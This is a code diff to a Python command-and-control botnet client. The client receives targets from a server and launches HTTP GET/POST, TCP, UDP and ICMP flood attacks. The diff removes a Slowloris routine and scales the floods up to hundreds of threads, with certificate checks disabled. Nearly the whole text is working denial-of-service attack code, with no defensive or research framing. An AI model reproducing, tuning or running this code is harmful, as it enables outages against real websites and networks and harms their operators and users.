@@ -1,12 +1,10 @@
 #!/usr/bin/env python3
 """
-C2 Client - Real Layer 4-7 Attack Implementation
-Sends REAL requests with multiple methods
+C2 Client - Real Layer 4-7 Attack with MAXIMUM POWER
+Uses urllib3 for extreme performance
 """
 import socketio
-import requests
 import socket
-import struct
 import random
 import string
 import threading
@@ -15,12 +13,17 @@ import sys
 import os
 import platform
 import psutil
+import urllib3
+import subprocess
 from datetime import datetime
-from urllib.parse import urlparse
-from queue import Queue
+from urllib.parse import urlparse, urlencode
+from concurrent.futures import ThreadPoolExecutor
 
-class RealAttackEngine:
-    """Real attack engine with actual network requests"""
+# Disable SSL warnings
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+class PowerfulAttackEngine:
+    """Ultra-powerful attack engine using urllib3 for maximum speed"""
     
     def __init__(self):
         self.running = False
@@ -31,200 +34,150 @@ class RealAttackEngine:
             'bytes_sent': 0
         }
         self.stats_lock = threading.Lock()
+        self.pools = []
         
-    def generate_random_string(self, length=10):
-        """Generate random string for cache busting"""
-        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
-    
     def generate_user_agent(self):
         """Generate random user agent"""
         agents = [
-            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
-            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
-            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0',
-            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15'
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.15',
+            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
         ]
         return random.choice(agents)
     
-    # ============= LAYER 7 ATTACKS (HTTP) =============
+    # ============= HTTP ATTACKS =============
     
-    def http_get_flood(self, target, duration, threads=10):
-        """Layer 7: HTTP GET flood with real requests"""
-        print(f"[L7] Starting HTTP GET flood on {target}")
+    def http_power_flood(self, target, duration, method='GET', threads=500):
+        """Powerful HTTP flood using urllib3 pools"""
+        print(f"[L7] Starting POWERFUL {method} flood on {target}")
         self.running = True
-        thread_pool = []
         
-        def worker():
-            session = requests.Session()
-            session.headers.update({'User-Agent': self.generate_user_agent()})
-            
-            while self.running and time.time() - start_time < duration:
-                try:
-                    # Cache busting
-                    cache_buster = f"?{self.generate_random_string()}={random.randint(1, 999999)}"
-                    url = target + cache_buster
-                    
-                    # Send real GET request
-                    response = session.get(url, timeout=5, allow_redirects=False)
-                    
-                    with self.stats_lock:
-                        self.stats['requests'] += 1
-                        self.stats['bytes_sent'] += len(response.content)
-                        if response.status_code < 500:
-                            self.stats['success'] += 1
-                        else:
-                            self.stats['failed'] += 1
-                            
-                except Exception as e:
-                    with self.stats_lock:
-                        self.stats['failed'] += 1
-                
-                time.sleep(0.001)  # Small delay
+        # Create multiple connection pools for maximum speed
+        pool_count = 50
+        for _ in range(pool_count):
+            pool = urllib3.PoolManager(
+                maxsize=1000,
+                retries=urllib3.Retry(
+                    total=2,
+                    backoff_factor=0.1,
+                    status_forcelist=[429, 500, 502, 503, 504]
+                ),
+                timeout=urllib3.Timeout(connect=3, read=6),
+                cert_reqs='CERT_NONE',
+                assert_hostname=False,
+                num_pools=50,
+                block=False
+            )
+            self.pools.append(pool)
+        
+        # Pre-generate headers
+        headers_list = []
+        for _ in range(100):
+            headers = {
+                'User-Agent': self.generate_user_agent(),
+                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+                'Accept-Language': 'en-US,en;q=0.9',
+                'Accept-Encoding': 'gzip, deflate, br',
+                'Connection': 'keep-alive',
+                'Cache-Control': 'no-cache',
+                'Upgrade-Insecure-Requests': '1'
+            }
+            headers_list.append(headers)
+        
+        # Pre-generate paths and payloads
+        paths = ['/', '/index.html', '/api', '/search', '/login', '/user']
+        payloads = [
+            b'data=test&type=check',
+            b'{"action":"ping"}',
+            b'test=' + b'x' * 1024
+        ]
         
         start_time = time.time()
-        
-        # Create worker threads
-        for i in range(threads):
-            t = threading.Thread(target=worker, daemon=True)
-            t.start()
-            thread_pool.append(t)
-        
-        # Wait for completion
-        for t in thread_pool:
-            t.join()
-        
-        return self.stats.copy()
-    
-    def http_post_flood(self, target, duration, threads=10):
-        """Layer 7: HTTP POST flood with real data"""
-        print(f"[L7] Starting HTTP POST flood on {target}")
-        self.running = True
-        thread_pool = []
+        request_count = 0
         
         def worker():
-            session = requests.Session()
-            session.headers.update({
-                'User-Agent': self.generate_user_agent(),
-                'Content-Type': 'application/x-www-form-urlencoded'
-            })
+            nonlocal request_count
+            pool_idx = 0
             
             while self.running and time.time() - start_time < duration:
                 try:
-                    # Generate random POST data
-                    data = {
-                        'search': self.generate_random_string(20),
-                        'q': self.generate_random_string(15),
-                        'data': self.generate_random_string(50),
-                        'id': random.randint(1, 999999)
+                    # Rotate pools
+                    pool = self.pools[pool_idx % len(self.pools)]
+                    pool_idx += 1
+                    
+                    # Build URL with cache busting
+                    timestamp = int(time.time() * 1000)
+                    path = random.choice(paths)
+                    url = f"{target.rstrip('/')}{path}?_={timestamp}&r={random.randint(1,999999)}"
+                    
+                    # Rotate headers
+                    headers = random.choice(headers_list)
+                    
+                    # Prepare request
+                    kwargs = {
+                        'headers': headers,
+                        'timeout': urllib3.Timeout(connect=2, read=4),
+                        'retries': False,
+                        'preload_content': False
                     }
                     
-                    # Send real POST request
-                    response = session.post(target, data=data, timeout=5, allow_redirects=False)
+                    if method == 'POST':
+                        kwargs['body'] = random.choice(payloads)
+                        headers['Content-Type'] = 'application/x-www-form-urlencoded'
+                    
+                    # Send request
+                    response = pool.request(method, url, **kwargs)
                     
                     with self.stats_lock:
                         self.stats['requests'] += 1
-                        self.stats['bytes_sent'] += len(str(data))
-                        if response.status_code < 500:
+                        if response.status < 500:
                             self.stats['success'] += 1
                         else:
                             self.stats['failed'] += 1
-                            
-                except Exception as e:
+                    
+                    response.drain_conn()
+                    request_count += 1
+                    
+                except Exception:
                     with self.stats_lock:
                         self.stats['failed'] += 1
-                
-                time.sleep(0.001)
         
-        start_time = time.time()
-        
-        for i in range(threads):
-            t = threading.Thread(target=worker, daemon=True)
-            t.start()
-            thread_pool.append(t)
-        
-        for t in thread_pool:
-            t.join()
-        
-        return self.stats.copy()
-    
-    def http_slowloris(self, target, duration, connections=200):
-        """Layer 7: Slowloris attack - keeps connections open"""
-        print(f"[L7] Starting Slowloris attack on {target}")
-        self.running = True
-        
-        parsed = urlparse(target)
-        host = parsed.netloc.split(':')[0]
-        port = int(parsed.netloc.split(':')[1]) if ':' in parsed.netloc else (443 if parsed.scheme == 'https' else 80)
-        
-        sockets = []
-        
-        def create_socket():
-            try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.settimeout(4)
-                s.connect((host, port))
-                
-                # Send partial HTTP request
-                s.send(f"GET {parsed.path or '/'} HTTP/1.1\r\n".encode())
-                s.send(f"Host: {host}\r\n".encode())
-                s.send(f"User-Agent: {self.generate_user_agent()}\r\n".encode())
-                
-                return s
-            except:
-                return None
-        
-        start_time = time.time()
-        
-        # Create initial connections
-        print(f"[L7] Creating {connections} slow connections...")
-        for i in range(connections):
-            s = create_socket()
-            if s:
-                sockets.append(s)
-                with self.stats_lock:
-                    self.stats['requests'] += 1
-        
-        print(f"[L7] Created {len(sockets)} connections, keeping alive...")
-        
-        # Keep connections alive
-        while self.running and time.time() - start_time < duration:
-            for s in list(sockets):
-                try:
-                    # Send partial header to keep alive
-                    s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
-                    with self.stats_lock:
-                        self.stats['success'] += 1
-                except:
-                    sockets.remove(s)
-                    # Create new connection
-                    new_s = create_socket()
-                    if new_s:
-                        sockets.append(new_s)
+        # Start worker threads
+        with ThreadPoolExecutor(max_workers=threads) as executor:
+            futures = [executor.submit(worker) for _ in range(threads)]
             
-            time.sleep(15)  # Send keep-alive every 15 seconds
+            # Wait for completion
+            while time.time() - start_time < duration and self.running:
+                time.sleep(0.5)
+            
+            self.running = False
+            
+            # Cancel remaining
+            for future in futures:
+                future.cancel()
         
-        # Close all connections
-        for s in sockets:
+        # Cleanup pools
+        for pool in self.pools:
             try:
-                s.close()
+                pool.clear()
             except:
                 pass
         
         return self.stats.copy()
     
-    # ============= LAYER 4 ATTACKS (TCP/UDP) =============
+    # ============= TCP ATTACKS =============
     
-    def tcp_syn_flood(self, target, duration, threads=10):
-        """Layer 4: TCP SYN flood"""
-        print(f"[L4] Starting TCP SYN flood on {target}")
+    def tcp_power_flood(self, target, duration, threads=200):
+        """Powerful TCP SYN flood"""
+        print(f"[L4] Starting POWERFUL TCP flood on {target}")
         self.running = True
         
         parsed = urlparse(target) if target.startswith('http') else type('obj', (object,), {'netloc': target})()
         host = parsed.netloc.split(':')[0] if hasattr(parsed, 'netloc') else target.split(':')[0]
         port = int(parsed.netloc.split(':')[1]) if ':' in (parsed.netloc if hasattr(parsed, 'netloc') else target) else 80
         
-        thread_pool = []
+        start_time = time.time()
         
         def worker():
             while self.running and time.time() - start_time < duration:
@@ -232,92 +185,102 @@ class RealAttackEngine:
                     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                     s.settimeout(0.1)
                     s.connect((host, port))
-                    s.send(b'GET / HTTP/1.1\r\n\r\n')
+                    
+                    # Send random data
+                    data = os.urandom(random.randint(100, 1024))
+                    s.send(data)
                     s.close()
                     
                     with self.stats_lock:
                         self.stats['requests'] += 1
                         self.stats['success'] += 1
+                        self.stats['bytes_sent'] += len(data)
                 except:
                     with self.stats_lock:
                         self.stats['failed'] += 1
         
-        start_time = time.time()
-        
-        for i in range(threads):
-            t = threading.Thread(target=worker, daemon=True)
-            t.start()
-            thread_pool.append(t)
-        
-        for t in thread_pool:
-            t.join()
+        with ThreadPoolExecutor(max_workers=threads) as executor:
+            futures = [executor.submit(worker) for _ in range(threads)]
+            
+            while time.time() - start_time < duration and self.running:
+                time.sleep(0.5)
+            
+            self.running = False
+            
+            for future in futures:
+                future.cancel()
         
         return self.stats.copy()
     
-    def udp_flood(self, target, duration, threads=10, packet_size=1024):
-        """Layer 4: UDP flood"""
-        print(f"[L4] Starting UDP flood on {target}")
+    # ============= UDP ATTACKS =============
+    
+    def udp_power_flood(self, target, duration, threads=100):
+        """Powerful UDP flood"""
+        print(f"[L4] Starting POWERFUL UDP flood on {target}")
         self.running = True
         
         parsed = urlparse(target) if target.startswith('http') else type('obj', (object,), {'netloc': target})()
         host = parsed.netloc.split(':')[0] if hasattr(parsed, 'netloc') else target.split(':')[0]
         port = int(parsed.netloc.split(':')[1]) if ':' in (parsed.netloc if hasattr(parsed, 'netloc') else target) else 80
         
-        thread_pool = []
+        start_time = time.time()
+        
+        # Pre-generate payloads
+        payloads = [os.urandom(size) for size in [256, 512, 1024, 2048, 4096, 8192, 16384, 32768, 65507]]
         
         def worker():
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            payload = random._urandom(packet_size)
             
             while self.running and time.time() - start_time < duration:
                 try:
+                    payload = random.choice(payloads)
                     sock.sendto(payload, (host, port))
                     
                     with self.stats_lock:
                         self.stats['requests'] += 1
-                        self.stats['bytes_sent'] += packet_size
                         self.stats['success'] += 1
+                        self.stats['bytes_sent'] += len(payload)
                 except:
                     with self.stats_lock:
                         self.stats['failed'] += 1
+            
+            sock.close()
         
-        start_time = time.time()
-        
-        for i in range(threads):
-            t = threading.Thread(target=worker, daemon=True)
-            t.start()
-            thread_pool.append(t)
-        
-        for t in thread_pool:
-            t.join()
+        with ThreadPoolExecutor(max_workers=threads) as executor:
+            futures = [executor.submit(worker) for _ in range(threads)]
+            
+            while time.time() - start_time < duration and self.running:
+                time.sleep(0.5)
+            
+            self.running = False
+            
+            for future in futures:
+                future.cancel()
         
         return self.stats.copy()
     
-    # ============= LAYER 3 ATTACKS (ICMP) =============
+    # ============= ICMP ATTACKS =============
     
-    def icmp_flood(self, target, duration, threads=5):
-        """Layer 3: ICMP ping flood"""
-        print(f"[L3] Starting ICMP flood on {target}")
+    def icmp_power_flood(self, target, duration, threads=50):
+        """Powerful ICMP flood"""
+        print(f"[L3] Starting POWERFUL ICMP flood on {target}")
         self.running = True
         
         host = urlparse(target).netloc if target.startswith('http') else target
         host = host.split(':')[0]
         
-        thread_pool = []
+        start_time = time.time()
+        system = platform.system().lower()
         
         def worker():
-            # Use system ping command for ICMP
-            import subprocess
-            
             while self.running and time.time() - start_time < duration:
                 try:
-                    # Rapid ping
-                    if platform.system().lower() == 'windows':
-                        cmd = ['ping', '-n', '1', '-w', '100', host]
+                    if system == "windows":
+                        cmd = f"ping -n 1 -w 100 -l 1024 {host}"
                     else:
-                        cmd = ['ping', '-c', '1', '-W', '1', host]
+                        cmd = f"ping -c 1 -W 1 -s 1024 {host}"
                     
-                    result = subprocess.run(cmd, capture_output=True, timeout=1)
+                    result = subprocess.run(cmd, shell=True, capture_output=True, timeout=1)
                     
                     with self.stats_lock:
                         self.stats['requests'] += 1
@@ -331,20 +294,21 @@ class RealAttackEngine:
                 
                 time.sleep(0.01)
         
-        start_time = time.time()
-        
-        for i in range(threads):
-            t = threading.Thread(target=worker, daemon=True)
-            t.start()
-            thread_pool.append(t)
-        
-        for t in thread_pool:
-            t.join()
+        with ThreadPoolExecutor(max_workers=threads) as executor:
+            futures = [executor.submit(worker) for _ in range(threads)]
+            
+            while time.time() - start_time < duration and self.running:
+                time.sleep(0.5)
+            
+            self.running = False
+            
+            for future in futures:
+                future.cancel()
         
         return self.stats.copy()
 
 class Layer7Client:
-    """Client that runs real attacks"""
+    """Client with POWERFUL attack capabilities"""
     
     def __init__(self, server_url='http://localhost:5000', client_name=None):
         self.server_url = server_url
@@ -362,7 +326,7 @@ class Layer7Client:
         self.current_attack = None
         self.running = False
         self.attack_thread = None
-        self.attack_engine = RealAttackEngine()
+        self.attack_engine = PowerfulAttackEngine()
         
         self.setup_handlers()
         
@@ -442,7 +406,7 @@ class Layer7Client:
             print(f"⚠️ Failed to notify server: {e}")
     
     def execute_attack(self, attack_data):
-        """Execute real attack"""
+        """Execute POWERFUL attack"""
         attack_id = attack_data.get('attack_id')
         target = attack_data.get('target')
         method = attack_data.get('method', 'http').lower()
@@ -450,15 +414,27 @@ class Layer7Client:
         
         # Calculate thread count based on CPU
         cpu_count = psutil.cpu_count()
-        threads = min(cpu_count * 20, 200)  # Max 200 threads
+        
+        # Set aggressive thread counts
+        thread_counts = {
+            'http': min(cpu_count * 100, 500),
+            'get': min(cpu_count * 100, 500),
+            'post': min(cpu_count * 100, 500),
+            'tcp': min(cpu_count * 50, 200),
+            'udp': min(cpu_count * 25, 100),
+            'icmp': min(cpu_count * 10, 50),
+            'ping': min(cpu_count * 10, 50)
+        }
+        threads = thread_counts.get(method, 500)
         
         try:
             print(f"\n{'='*60}")
-            print(f"🚀 EXECUTING REAL ATTACK")
+            print(f"💥 EXECUTING POWERFUL ATTACK")
             print(f"   Target: {target}")
             print(f"   Method: {method.upper()}")
             print(f"   Duration: {duration}s")
             print(f"   Threads: {threads}")
+            print(f"   Power: MAXIMUM")
             print(f"{'='*60}\n")
             
             start_time = time.time()
@@ -468,22 +444,19 @@ class Layer7Client:
                 'requests': 0, 'success': 0, 'failed': 0, 'bytes_sent': 0
             }
             
-            # Execute attack based on method
-            if method == 'http' or method == 'get':
-                results = self.attack_engine.http_get_flood(target, duration, threads)
+            # Execute powerful attack
+            if method in ['http', 'get']:
+                results = self.attack_engine.http_power_flood(target, duration, 'GET', threads)
             elif method == 'post':
-                results = self.attack_engine.http_post_flood(target, duration, threads)
-            elif method == 'slowloris':
-                results = self.attack_engine.http_slowloris(target, duration, min(threads, 200))
+                results = self.attack_engine.http_power_flood(target, duration, 'POST', threads)
             elif method == 'tcp':
-                results = self.attack_engine.tcp_syn_flood(target, duration, threads)
+                results = self.attack_engine.tcp_power_flood(target, duration, threads)
             elif method == 'udp':
-                results = self.attack_engine.udp_flood(target, duration, threads)
-            elif method == 'icmp' or method == 'ping':
-                results = self.attack_engine.icmp_flood(target, duration, min(threads, 10))
+                results = self.attack_engine.udp_power_flood(target, duration, threads)
+            elif method in ['icmp', 'ping']:
+                results = self.attack_engine.icmp_power_flood(target, duration, threads)
             else:
-                # Default to HTTP GET
-                results = self.attack_engine.http_get_flood(target, duration, threads)
+                results = self.attack_engine.http_power_flood(target, duration, 'GET', threads)
             
             elapsed = time.time() - start_time
             actual_rps = results['requests'] / elapsed if elapsed > 0 else 0
@@ -506,12 +479,12 @@ class Layer7Client:
                 print(f"⚠️ Failed to report completion: {e}")
             
             print(f"\n✅ Attack completed in {elapsed:.1f}s")
-            print(f"   Total Requests: {results['requests']:,}")
-            print(f"   Successful: {results['success']:,}")
-            print(f"   Failed: {results['failed']:,}")
-            print(f"   RPS: {actual_rps:.1f}")
-            print(f"   Success Rate: {success_rate:.1f}%")
-            print(f"   Data Sent: {results['bytes_sent'] / 1024 / 1024:.2f} MB")
+            print(f"   💥 Total Requests: {results['requests']:,}")
+            print(f"   ✅ Successful: {results['success']:,}")
+            print(f"   ❌ Failed: {results['failed']:,}")
+            print(f"   ⚡ RPS: {actual_rps:.1f}")
+            print(f"   📊 Success Rate: {success_rate:.1f}%")
+            print(f"   📦 Data Sent: {results['bytes_sent'] / 1024 / 1024:.2f} MB")
             
         except Exception as e:
             print(f"\n❌ Attack error: {str(e)}")
@@ -560,12 +533,13 @@ class Layer7Client:
         """Connect to server and start monitoring"""
         try:
             print("\n" + "="*60)
-            print("🤖 LAYER7 Real Attack Client")
+            print("💥 LAYER7 POWERFUL ATTACK CLIENT")
             print(f"🔗 Connecting to: {self.server_url}")
             print(f"🏷️  Client: {self.client_name}")
             print(f"💻 Platform: {platform.platform()}")
             print(f"⚡ CPUs: {psutil.cpu_count()} cores")
             print(f"💾 RAM: {psutil.virtual_memory().total / 1024 / 1024 / 1024:.1f} GB")
+            print(f"🔥 Power Level: MAXIMUM")
             print("="*60 + "\n")
             
             print("⚡ Connecting...")
@@ -613,9 +587,9 @@ def main():
     """Main function"""
     print("""
     ╔══════════════════════════════════════╗
-    ║    LAYER7 REAL ATTACK CLIENT        ║
-    ║    Sends REAL network requests      ║
-    ║    Layer 3-7 Support                ║
+    ║    LAYER7 POWERFUL ATTACK CLIENT    ║
+    ║    Maximum Performance Engine       ║
+    ║    Layer 3-7 Support               ║
     ╚══════════════════════════════════════╝
     """)
     
